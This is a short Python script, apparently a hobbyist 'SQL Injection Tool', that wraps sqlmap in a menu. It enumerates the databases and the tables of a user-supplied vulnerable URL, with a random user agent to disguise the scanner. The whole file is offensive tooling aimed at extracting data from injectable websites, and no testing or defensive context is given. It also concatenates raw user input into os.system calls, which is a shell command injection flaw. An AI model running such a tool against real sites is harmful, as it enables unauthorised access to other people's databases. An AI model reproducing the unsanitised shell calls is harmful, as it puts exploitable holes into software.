import os

# Install figlet using the apt-get package manager
os.system("apt-get install figlet")

# Clear the terminal screen
os.system("clear")

# Use figlet to create a large ASCII banner for the title
os.system("figlet VTCA")

# Print a menu with options for the user to choose from
print("""
+++ SQL Injection Tool +++
1: Vulnerable Link
2: Vulnerable Link and Database Name
""")

# Get user input for the chosen menu item
islemno = input("Enter the menu number: ")

# Perform the selected action based on the user's input
if islemno == "1":
    # Get user input for the vulnerable link
    aciklilink = input("Enter the vulnerable link: ")
    
    # Use sqlmap to scan the vulnerable link and retrieve the databases
    os.system("sqlmap -u " + aciklilink + " --random-agent --dbs")
    
elif islemno == "2":
    # Get user input for the vulnerable link and database name
    aciklilink = input("Enter the vulnerable link: ")
    veritabani = input("Enter the database name: ")
    
    # Use sqlmap to scan the vulnerable link and retrieve the tables in the specified database
    os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --random-agent --tables")
